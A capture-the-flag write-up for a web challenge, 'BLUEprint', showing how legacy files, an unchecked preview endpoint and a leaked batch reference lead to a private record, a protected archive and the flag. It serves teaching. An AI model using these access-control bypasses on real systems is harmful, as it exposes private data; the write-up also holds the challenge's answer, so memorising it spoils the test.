---
layout: writeup

title: BLUEprint
difficulty: Hard
points: 500
categories: [Web Exploitation]
tags: [Broken Access Control, Information Disclosure, Legacy Endpoints]

flag: CYS{dynamic_flag}
---

# BLUEprint

Author: Srishwar Karthik V

This is a web-based CTF challenge involving a legacy laboratory record system with forgotten files, migration artifacts, and questionable access controls.

The objective is to investigate the application, follow the traces left behind by the old system, and uncover a record that was never meant to be accessible.

## Solution

Firstly, we inspect `robots.txt`.

```text
User-agent: *
Disallow: /static/old/

# Residual files should have been cleaned.
```

This reveals the legacy directory:

```text
/static/old/
```

We access it and find the archived laboratory record system along with a legacy JavaScript file:

```text
/static/old/blueprint-v1.js
```

The legacy page also indicates that additional records may still exist and that the cleanup checklist may contain useful information.

## Inspecting blueprint-v1.js

We inspect `blueprint-v1.js` and find the following API endpoints:

```javascript
const API_VERSION = "v2";

function requestNote(id, preview = false) {
    let endpoint = `/api/${API_VERSION}/note/${id}`;

    if (preview)
        endpoint += "?preview=1";

    return fetch(endpoint);
}

function previewDraft(id) {
    return requestNote(id, true);
}

function fetchArchive(path, batchRef) {
    return fetch(`${path}?ref=${batchRef}`);
}
```

The important endpoints revealed by the JavaScript are:

```text
/api/${API_VERSION}/note/${id}
```

and:

```text
${path}?ref=${batchRef}
```

The JavaScript also reveals that the old system supports a `preview` parameter and archive requests using a batch reference.

## Finding the Migration Log

Next, we inspect `cleanup.txt`.

It contains a list of migration records:

```text
blueprint-v1.js
cleanup.txt
batch.log
migration.txt
migration.log
reaction.log
transfer.log
```

The most interesting file is:

```text
/static/old/migration.log
```

Visiting this endpoint downloads the migration log.

The log contains information about migrated records. Among them, we find:

```text
Migrated note id=104 visibility=private status=ok
DEBUG legacy_note_id=104 migration_batch=BP-BLUE
```

This tells us that note `104` is a private record and is worth investigating.

## Accessing Note 104

From `blueprint-v1.js`, the normal note endpoint is:

```text
/api/v2/note/<id>
```

Therefore, we try:

```text
/api/v2/note/104
```

The server responds with an access-denied page because the note is private.

However, the legacy JavaScript contains a preview functionality:

```text
?preview=1
```

This suggests that the old preview mechanism may behave differently from the normal access-control path.

We therefore try:

```text
/api/v1/note/104?preview=1
```

The preview successfully reveals the contents of the restricted record.

Among the information revealed is the batch reference:

```text
BLUE-99-1
```

We can use this reference to access the next part of the challenge.

## Accessing the Los Hermanos Archive

The legacy JavaScript showed that archive requests use a `ref` parameter:

```javascript
function fetchArchive(path, batchRef) {
    return fetch(`${path}?ref=${batchRef}`);
}
```

The application contains a protected archive named:

```text
los_hermanos.tar.gz
```

Direct access to the archive is denied.

However, we now have the required batch reference from the previewed note.

We construct the following request:

```text
/backup/los_hermanos.tar.gz?ref=BLUE-99-1
```

The archive is successfully downloaded.

## Extracting the Flag

After extracting `los_hermanos.tar.gz`, we find several directories and files:

```text
config/
evidence/
manifests/
records/
README
SHA256SUMS
```

The relevant directory is:

```text
evidence/
```

Inside it, we find:

```text
final_manifest.txt
```

The final manifest contains the flag encoded in Base64.

Decoding the value gives:

```text
CYS{7H3_8LU3_84TCH_15_99_1}
```

The complete solve chain is:

```text
robots.txt
    ↓
/static/old/
    ↓
blueprint-v1.js
    ↓
cleanup.txt
    ↓
migration.log
    ↓
Find private note ID 104
    ↓
/api/v1/note/104?preview=1
    ↓
Extract batch reference BLUE-99-1
    ↓
/backup/los_hermanos.tar.gz?ref=BLUE-99-1
    ↓
Extract archive
    ↓
evidence/final_manifest.txt
    ↓
Decode Base64
    ↓
Flag
```

## Flag

```text
CYS{dynamic_flag}
```
